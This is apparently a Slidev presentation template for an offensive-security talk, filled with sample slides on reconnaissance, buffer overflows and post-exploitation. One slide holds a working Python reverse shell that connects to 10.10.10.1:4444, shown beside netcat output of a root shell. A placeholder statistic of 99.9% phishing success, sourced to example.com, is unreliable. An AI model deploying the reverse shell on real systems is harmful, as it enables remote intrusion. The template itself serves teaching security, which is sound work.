---
theme: seriph
background: '#0a1628'
class: 'text-center'
highlighter: shiki
lineNumbers: false
drawings:
  persist: false
transition: slide-left
title: 'Offensive Security & Vulnerability Research'
info: |
  ## Cybersecurity Talk Template
  A Slidev template for pentesting, red teaming, and binary exploitation presentations.
fonts:
  sans: 'Consolas, Inter, system-ui, -apple-system, sans-serif'
  mono: 'JetBrains Mono, IBM Plex Mono, Fira Code, monospace'
---

<style>
  /* Global styles with blue tint */
  .slidev-layout {
    background: linear-gradient(135deg, #0a1628 0%, #1a2744 50%, #0d1f3c 100%);
    color: #e8f0fe;
    font-family: 'Inter', system-ui, -apple-system, sans-serif;
    position: relative;
    overflow: hidden;
  }
  
  h1, h2, h3, h4, h5 {
    color: #7ab7ff !important;
    font-family: 'Inter', system-ui, -apple-system, sans-serif;
  }
  
  /* Code block styling */
  .shiki {
    background: rgba(10, 22, 40, 0.8) !important;
    border: 1px solid rgba(70, 130, 255, 0.2);
    border-radius: 8px;
    font-family: 'JetBrains Mono', 'IBM Plex Mono', 'Fira Code', monospace !important;
  }
  
  /* Link styling */
  a {
    color: #7ab7ff;
    text-decoration: none;
  }
  
  a:hover {
    color: #9ac9ff;
  }
  
  /* Table styling */
  table {
    width: 100%;
    border-collapse: collapse;
  }
  
  th {
    background: rgba(70, 130, 255, 0.2);
    color: #7ab7ff;
    padding: 12px;
    border: 1px solid rgba(70, 130, 255, 0.2);
  }
  
  td {
    padding: 12px;
    border: 1px solid rgba(70, 130, 255, 0.1);
    color: #e8f0fe;
  }
  
  /* tr:hover {
    background: rgba(70, 130, 255, 0.05);
  } */
  
  /* Code text styling */
  code, .font-mono {
    font-family: 'JetBrains Mono', 'IBM Plex Mono', 'Fira Code', monospace !important;
  }
</style>

# Offensive Security
## Vulnerability Research & Exploitation

<!--
The title slide features a dark, code-themed background with a large title and subtitle.
-->


---
layout: default
---

# Talk Agenda (Simple List)

1. **Introduction** - Background and scope
2. **Reconnaissance** - Network scanning, OSINT
3. **Exploitation** - Buffer overflows, RCE
4. **Post-Exploitation** - Persistence, lateral movement
5. **Defensive Countermeasures** - Mitigations
6. **Q&A** - Open discussion

<!--
Agenda/Table of Contents with numbered list.
-->

---
layout: agenda
---

# Talk Agenda (with Layout)

1. **Introduction**  <span class="desc">Background and scope</span>
2. **Reconnaissance**  <span class="desc">Network scanning, OSINT</span>
3. **Exploitation**  <span class="desc">Buffer overflows, RCE</span>
4. **Post-Exploitation**  <span class="desc">Persistence, lateral movement</span>
5. **Defensive Countermeasures**  <span class="desc">Mitigations</span>
6. **Q&A**  <span class="desc">Open discussion</span>

<!--
Agenda/Table of Contents with numbered list with a custom layout.
-->

---
layout: section
---

# Reconnaissance & Enumeration

<!--
Section headers introduce new modules with a bold title and divider line.
-->

---
layout: default
---

# Active Directory Enumeration

- **LDAP Queries**: Enumerate users, groups, and OU structures
- **SMB Shares**: Identify accessible file shares and permissions
- **BloodHound**: Map attack paths using graph theory
- **Kerberos**: Enumerate SPNs for kerberoasting attacks

```bash
# Example LDAP query
ldapsearch -x -H ldap://dc.corp.local -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName
```

<!--
Title & Content layout with a title bar and large content area for bullet points and code.
-->

---
layout: big-number
---

::number::
99.9%

::caption::
Success rate of phishing simulations in 2023

::subcaption::
[Source: Annual Security Report 2023](https://example.com)


---
layout: quote
---

# "The best defense is a good offense - and understanding how attackers think."

— *Anonymous Penetration Tester*

<!--
Quote layout with a centered, large-font excerpt and attribution.
-->

---
layout: default
---

# Attack Surface: Windows vs Linux

| Feature | Windows | Linux |
|---------|---------|-------|
| Authentication | NTLM, Kerberos | PAM, SSH keys |
| Privilege Escalation | UAC, SeDebugPrivilege | Sudo, SUID binaries |
| Persistence | Scheduled Tasks, Services | Cron jobs, Systemd timers |
| Logging | Event Viewer (EVTX) | Syslog, Auditd |


---
layout: full
---

# Live Target Visualization

<!--
Title Only layout for full-screen diagrams or terminal outputs.
-->

<div class="grid grid-cols-2 gap-4 h-96">
  <div class="border border-gray-500 rounded p-4 font-mono text-sm">
    <div class="text-green-400">$ nmap -sV 10.10.10.0/24</div>
    <div class="text-gray-300">22/tcp open  ssh     OpenSSH 7.9</div>
    <div class="text-yellow-300">80/tcp open  http    Apache 2.4.41</div>
    <div class="text-red-400">445/tcp open  microsoft-ds SMB 3.1.1</div>
  </div>
  <div class="border border-gray-500 rounded p-4">
    <div class="text-blue-400 text-center">Network Topology</div>
    <div class="flex items-center justify-center h-40">
      <svg viewBox="0 0 200 100" class="w-full">
        <circle cx="100" cy="50" r="20" fill="#4f46e5"/>
        <text x="100" y="55" fill="white" font-size="10" text-anchor="middle">Target</text>
      </svg>
    </div>
  </div>
</div>

<!--
Blank layout for custom whiteboard-style explanations.
-->

---
layout: image-right
image: /assets/image.png
---

# Exploit Analysis

<div class="text-sm">
  <h3>Buffer Overflow Vulnerability</h3>
  <p class="mb-2">The application does not validate input length, allowing stack corruption.</p>
  <div class="bg-gray-800 p-3 rounded font-mono text-xs">
    <span class="text-red-400">EIP = 0x41414141</span><br>
    <span class="text-green-300">ESP = 0x00BFFA30</span><br>
    <span class="text-yellow-300">EAX = 0x00000000</span>
  </div>
  <p class="mt-2 text-yellow-300">➜ 400 bytes of padding + JMP ESP gadget</p>
</div>


<!--
Content with Caption layout: diagram on the right with explanatory notes on the left.
-->

---
layout: default
---

# Vulnerability Metrics

| CVE | CVSS Score | Impact | Exploit Available |
|-----|------------|--------|-------------------|
| CVE-2023-1234 | 9.8 (Critical) | Remote Code Execution | Yes (Metasploit) |
| CVE-2023-5678 | 7.5 (High) | Information Disclosure | Public PoC |
| CVE-2023-9012 | 6.1 (Medium) | XSS | No |

<!--
Table layout with a title and full-width grid for structured data.
-->

---
layout: default
---

# Stack Smashing Prototype

```c {all|1-3|5-8|10-12}
void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input); // No bounds checking!
}

int main(int argc, char **argv) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}
```

<!--
Code Full-Page layout with a large monospaced code block and title bar.
-->


---
layout: default
---

# Memory Layout Example

<MemoryLayout :rows="[
  { field: 'age', type: 'int', size: 4, value: 42, color: 'blue' },
  { field: 'name', type: 'char[6]', size: 6, value: '\u0022Alice\u0022', offset: '0x04' },
  { field: 'buffer', type: 'char[16]', size: 16, value: '\u0022AAAAAAAAAAAAAAAA\u0022', height: 2, color: 'yellow', annotation: 'Overflow target' },
  { field: 'vtable_ptr', type: 'void*', size: 8, value: '[0x7fff1234]', color: 'red', annotation: 'Gets overwritten' },
  { field: 'padding', type: 'char[2]', size: 2, value: '0x00', color: 'gray' }
]" />

---

# Another Memory Layout

<MemoryLayout 
  title="VTable Layout"
  :rows="[
    { field: 'vtable_ptr', type: 'void**', size: 8, value: '[0x401234]', color: 'blue' },
    { field: 'constructor', type: 'void(*)()', size: 8, value: '[0x401000]', color: 'green' },
    { field: 'destructor', type: 'void(*)()', size: 8, value: '[0x401050]', color: 'green', annotation: 'Virtual destructor' },
    { field: 'virtual_func', type: 'void(*)()', size: 8, value: '[0x401100]', color: 'yellow' }
  ]"
/>

---
layout: two-cols
---

::left::

## SMB
- Port 445
- Legacy NetBIOS (port 139)
- Used for file sharing
- Supports NTLM authentication

::right::

## RPC
- Port 135
- Dynamic port range (1024-5000)
- Used for remote management
- Supports Kerberos authentication

<!--
Two Content layout with a split screen for comparing protocols without header.
-->

---
layout: two-cols-header
---

# Reverse Shell Payload

::left::

**Source Code**
```python
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.10.1", 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subprocess.call(["/bin/sh", "-i"])
```

::right::

**Terminal Output**
```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.10.1] from (UNKNOWN) [10.10.10.2] 49152
whoami
root
pwd
/home/user
```

<!--
Code + Output layout showing source code and its console output.
-->

---
layout: three-column
align: top
---

# Attack Kill Chain

::left::

### 🔍 Recon
- OSINT gathering
- Network scanning
- Service enumeration

::center::

### ⚡ Exploitation
- Payload development
- Vulnerability exploitation
- Privilege escalation

::right::

### 🎯 Post-Exploit
- Lateral movement
- Data exfiltration
- Cover tracks


---
layout: grid-4
---

# Attack Screenshots

::image1::
![Screenshot 1](/assets/deserialization_meme_69.png)

::image2::
![Screenshot 2](/assets/deserialization_meme_69.png)

::image3::
![Screenshot 3](/assets/deserialization_meme_69.png)

::image4::
![Screenshot 4](/assets/deserialization_meme_69.png)

---
layout: default
---

# Exploit Demo: Walkthrough

<video controls class="w-full h-96 bg-black">
  <source src="/assets/video.mp4" type="video/mp4">
</video>

<!--
Media/Video layout with a placeholder for embedding a screen recording.
-->

---
layout: end
---

# Thank You

## Questions?

<div class="mt-8 flex justify-center gap-8 text-sm">
  <div>📧 email@security.com</div>
  <div>🐙 github.com/security-guy</div>
  <div>🔗 linkedin.com/in/security-guy</div>
</div>

<!--
Closing/Thank You layout with contact information.
-->